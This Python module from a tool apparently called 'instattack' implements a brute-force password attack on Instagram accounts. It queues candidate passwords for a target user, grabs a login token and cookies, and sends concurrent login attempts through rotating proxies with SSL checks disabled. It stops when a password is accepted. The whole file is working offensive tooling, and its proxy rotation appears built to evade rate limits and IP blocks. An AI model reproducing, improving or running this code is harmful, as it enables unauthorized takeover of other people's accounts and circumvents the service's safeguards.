from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs

from instattack.config import config

from instattack.lib.utils import (
    percentage, limit_as_completed, start_and_stop, break_before)

from instattack.app.exceptions import (
    NoPasswordsError, find_request_error, find_response_error)

from instattack.app.mixins import LoggerMixin
from instattack.app.proxies import ProxyBroker, ProxyPool

from .models import InstagramResults
from .utils import get_token
from .login import attempt


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class Handler(LoggerMixin):

    SCHEDULER_LIMIT = 1000

    def __init__(self, loop, start_event=None, stop_event=None):

        self.loop = loop

        self.start_event = start_event
        self.stop_event = stop_event

        self.scheduler = self.loop.run_until_complete(aiojobs.create_scheduler(
            limit=self.SCHEDULER_LIMIT,
        ))

    async def schedule_task(self, coro):
        await self.scheduler.spawn(coro)

    async def close_scheduler(self):
        log = self.create_logger('close_scheduler')
        await log.start('Closing Scheduler')
        await self.scheduler.close()
        await log.complete('Scheduler Closed')


class ProxyHandler(Handler):

    __name__ = "Proxy Handler"

    def __init__(self, loop, start_event=None, stop_event=None):
        """
        [x] TODO:
        ---------
        We need to use the stop event to stop the broker just in case an authenticated
        result is found.

        What would be really cool would be if we could pass in our custom pool
        directly so that the broker popoulated that queue with the proxies.
        """
        super(ProxyHandler, self).__init__(loop, start_event=start_event,
            stop_event=stop_event)

        self.broker = ProxyBroker(loop)
        self.pool = ProxyPool(loop, self.broker, start_event=self.start_event)

    async def stop(self):
        if self.broker._started:
            self.broker.stop()

    async def run(self):
        """
        Retrieves proxies from the queue that is populated from the Broker and
        then puts these proxies in the prioritized heapq pool.

        Prepopulates proxies if the flag is set to put proxies that we previously
        saved into the pool.

        [x] TODO:
        ---------
        We are eventually going to need the relationship between prepopulation
        and collection to be more dynamic and adjust, and collection to trigger
        if we are running low on proxies.
        """
        log = self.create_logger('start')
        await log.start(f'Starting {self.__name__}')

        try:
            await log.debug('Prepopulating Proxy Pool...')
            await self.pool.prepopulate()
        except Exception as e:
            raise e

        if config['pool']['collect']:
            # Pool will set start event when it starts collecting proxies.
            await self.pool.collect()
        else:
            if self.start_event.is_set():
                raise RuntimeError('Start Event Already Set')

            self.start_event.set()
            await log.info('Setting Start Event', extra={
                'other': 'Proxy Pool Prepopulated'
            })


class RequestHandler(Handler):

    def __init__(self, loop, proxy_handler, **kwargs):
        super(RequestHandler, self).__init__(loop, **kwargs)

        self.proxy_handler = proxy_handler
        self.num_completed = 0
        self.proxies_to_save = []

    async def finish(self):
        """
        [x] TODO:
        --------
        Figure out a way to guarantee that this always gets run even if we hit
        some type of error.
        """
        if config['proxies']['save_method'] == 'end':
            with start_and_stop(f"Saving {len(self.proxies_to_save)} Proxies"):
                tasks = [proxy.save() for proxy in self.proxies_to_save]
                await asyncio.gather(*tasks)

    def connector(self, loop):
        return aiohttp.TCPConnector(
            loop=loop,
            ssl=False,
            force_close=True,
            limit=config['connection']['limit'],
            limit_per_host=config['connection']['limit_per_host'],
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=config['connection']['timeout']
        )

    async def on_proxy_request_error(self, proxy, e):
        err = find_request_error(e)
        if not err:
            raise e

        await self.proxy_handler.pool.on_proxy_request_error(proxy, err)

        if config['proxies']['save_method'] == 'live':
            await self.schedule_task(proxy.save())
        else:
            # Do we need to find and replace here?
            if proxy not in self.proxies_to_save:
                self.proxies_to_save.append(proxy)

    async def on_proxy_response_error(self, proxy, e):
        err = find_response_error(e)
        if not err:
            raise e

        await self.proxy_handler.pool.on_proxy_response_error(proxy, err)

        if config['proxies']['save_method'] == 'live':
            await self.schedule_task(proxy.save())
        else:
            # Do we need to find and replace here?
            if proxy not in self.proxies_to_save:
                self.proxies_to_save.append(proxy)

    async def on_proxy_success(self, proxy):
        await self.proxy_handler.pool.on_proxy_success(proxy)

        if config['proxies']['save_method'] == 'conclusively':
            # Do we need to find and replace here?
            if proxy not in self.proxies_to_save:
                self.proxies_to_save.append(proxy)
        else:
            await self.schedule_task(proxy.save())


class TrainHandler(RequestHandler):

    __name__ = 'Train Handler'



class AttackHandler(RequestHandler):

    __name__ = 'Login Handler'

    def __init__(self, *args, **kwargs):
        super(AttackHandler, self).__init__(*args, **kwargs)

        self.user = self.loop.user
        self.passwords = asyncio.Queue()

        self._cookies = None
        self._token = None

        self.attempts_to_save = []
        self.num_passwords = 0

    async def attempt_single_login(self, password):
        await self.passwords.put(password)
        self.num_passwords = 1
        results = await self.attempt_login(self.loop)
        await self.finish_attack()
        return results

    async def attack(self, limit=None):
        await self.prepopulate(limit=limit)
        results = await self.attempt_login(self.loop)
        await self.finish_attack()
        return results

    async def finish(self):
        """
        [x] TODO:
        --------
        Figure out a way to guarantee that this always gets run even if we hit
        some type of error.
        """
        await super(AttackHandler, self).finish()

        if config['attempts']['save_method'] == 'end':
            with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
                tasks = [
                    self.user.create_or_update_attempt(att[0], success=att[1])
                    for att in self.attempts_to_save
                ]
                await asyncio.gather(*tasks)

    async def prepopulate(self, limit=None):
        log = self.create_logger('prepopulate')

        message = f'Generating All Attempts for User {self.user.username}.'
        if limit:
            message = (
                f'Generating {limit} '
                f'Attempts for User {self.user.username}.'
            )
        await log.start(message)

        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    @property
    def token(self):
        if not self._token:
            raise RuntimeError('Token Not Found Yet')
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self.connector(self.loop))
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            await sess.close()

        return self._cookies

    async def login_task_generator(self, loop, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('attempt_login')

        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:

                context = {
                    'session': session,
                    'token': self.token,
                    'password': password
                }

                yield attempt(
                    loop,
                    context,
                    pool=self.proxy_handler.pool,
                    on_proxy_success=self.on_proxy_success,
                    on_proxy_request_error=self.on_proxy_request_error,
                    on_proxy_response_error=self.on_proxy_response_error,
                )

        await log.debug('Passwords Queue is Empty')

    async def attempt_login(self, loop):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('attempt_login')

        results = InstagramResults(results=[])
        cookies = await self.cookies()

        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector(loop),
            cookies=cookies,
            timeout=self.timeout,
            loop=loop,
        ) as session:
            gen = self.login_task_generator(loop, session)
            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
                gen, config['passwords']['batch_size'], self.stop_event,
            ):
                # Generator Does Not Yield None on No More Coroutines
                if result.conclusive:
                    self.num_completed += 1
                    results.add(result)

                    pct = percentage(self.num_completed, self.num_passwords)
                    await log.info(f'{pct}', extra={
                        'other': f'Num Attempts: {num_tries}',
                        'password': result.password,
                    })

                    if config['attempts']['save_method'] == 'live':
                        task = self.user.create_or_update_attempt(
                            result.password,
                            success=result.authorized
                        )
                        await self.schedule_task(task)
                    else:
                        if (result.password, result.authorized) not in self.attempts_to_save:
                            self.attempts_to_save.append((result.password, result.authorized))

                    # TODO: This Causes asyncio.CancelledError
                    # await cancel_remaining_tasks(futures=current_tasks)

                    if result.authorized:
                        self.stop_event.set()
                        break

        await log.complete('Closing Session')
        await asyncio.sleep(0)

        await self.close_scheduler()
        return results
